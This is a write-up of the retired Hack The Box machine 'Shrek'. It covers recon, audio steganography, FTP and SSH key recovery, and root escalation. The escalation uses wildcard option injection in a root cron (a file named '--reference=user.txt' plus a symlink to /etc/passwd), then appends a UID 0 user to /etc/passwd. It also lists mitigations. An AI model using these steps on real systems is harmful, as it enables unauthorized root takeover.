---
machine: Shrek
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, steganography, ftp, ssh-key, wildcard, chown, privesc]
---

# Shrek — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`/uploads` does not work as a manager but exposes suspicious files; one contains a comment pointing to `/secret_area_51`. That directory holds an MP3 with hidden data: the spectrogram and the chunks at the end of the file hide the FTP credentials. FTP serves an encrypted SSH key and 31 `.txt` files with base64 data; two of them hold a passphrase and an encrypted blob that, once decrypted, reveal the key's password. With SSH as `sec`, a cron running `chown nobody:nobody *` in a writable directory is found; a symlink to `/etc/passwd` makes the wildcard change its owner, and once editable a root user is added.

## Reconnaissance

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- `21` vsftpd 3.0.3.
- `22` OpenSSH 7.5.
- `80` Apache httpd 2.4.27 (Unix).

```bash
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

`/uploads` and `/secret_area_51` appear.

## Enumeration

`/uploads` returns a listing with malware samples. One script includes a comment about a "secret directory": `/secret_area_51`. It contains only a copy of an MP3.

The file is analyzed with Audacity (spectrogram view) and with `binwalk`/`strings`. At the end of the song there is data that is not part of the audio; the spectrogram shows a message and the trailing chunk holds the FTP credentials:

```bash
binwalk allstar.mp3
strings -n 6 allstar.mp3 | tail -20
```

## Foothold

With the FTP credentials, 31 `.txt` files and a `key` are listed:

```bash
ftp <IP>
ls
mget *.txt
get key
```

The `.txt` files hold base64 strings. Two include a passphrase and an encrypted blob; decoding and decrypting the blob yields the SSH key's password:

```bash
base64 -d file1.txt > pass.txt
base64 -d file2.txt > blob.enc
openssl enc -d -aes-256-cbc -in blob.enc -pass file:pass.txt
```

The `key` is encrypted; with the recovered passphrase it logs in as `sec`:

```bash
chmod 600 key
ssh -i key sec@<IP>
```

## Lateral movement

There is no second host. `sec` has a small home and a working directory where the scheduled task runs. Enumeration focuses on `pspy`, permissions and ownership changes.

## Privilege escalation

`pspy` shows a cron running `chown nobody:nobody *` on a writable directory:

```text
CMD: UID=0 ... | /bin/chown nobody:nobody *
```

The wildcard expands to the directory's names, and `chown` accepts options arriving in those names. A file owned by `sec` is created as the reference, plus a file named `--reference=<that file>` and a `passwd` symlink to `/etc/passwd`:

```bash
cd /usr/src
touch user.txt                 # owned by sec
touch -- --reference=user.txt
ln -s /etc/passwd passwd
```

The cron runs `chown nobody:nobody --reference=user.txt passwd`: it takes `user.txt`'s owner (`sec`) and applies it to `/etc/passwd`, following the symlink. With the file under their control, `sec` adds a UID 0 user and runs `su`:

```bash
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
```

*Beyond Root* explains why the directory's notes file does not change owner and documents an alternative path based on the box's automation.

## Evidence

- `/secret_area_51` and the MP3 with trailing data.
- FTP credentials in the chunk and a message in the spectrogram.
- Encrypted SSH key and passphrase recovered from the `.txt` files.
- `pspy` showing `chown nobody:nobody *`.
- Symlink to `/etc/passwd`, changed owner and UID 0 user.

## Lessons learned

- Steganography can hide credentials in audio and metadata, not only images.
- An FTP full of "malware" can be a trail of clues.
- A wildcard in a privileged command processes attacker-controlled names.
- `chown` follows symlinks by default; use `-h` and check the file type.
- Changing the owner of `/etc/passwd` is equivalent to granting root.

## Mitigations and detection

- Do not publish directories with samples or internal files.
- Inspect MP3s and documents before uploading; never trust the extension.
- Avoid wildcards in privileged scripts; use `find` with `-maxdepth` and `-type f`.
- Run `chown` with `-h` and on an explicit file list.
- Monitor ownership changes on `/etc/passwd`, `/etc/shadow` and `/etc/sudoers`.
- Alert on symlinks in cron-processed directories and on new UID 0 users.

## References

- [0xdf — Shrek](https://0xdf.gitlab.io/2020/07/22/htb-shrek.html)
- [IppSec — Shrek](https://www.youtube.com/watch?v=tI592BjTd4o)
- [Hack The Box — Shrek](https://app.hackthebox.com/machines/shrek)
